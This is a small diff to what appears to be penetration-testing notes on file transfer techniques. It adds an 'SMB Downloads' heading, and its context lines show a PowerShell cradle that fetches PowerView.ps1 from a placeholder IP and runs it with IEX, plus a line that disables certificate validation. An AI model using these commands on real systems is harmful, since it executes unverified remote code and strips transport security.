@@ -103,3 +103,8 @@ Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX -UseBasicParsing
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 ```
 - This makes certificate validation callback always accept the certification 
+
+---
+
+## SMB Downloads
+- SMB protocol that runs on port 445 
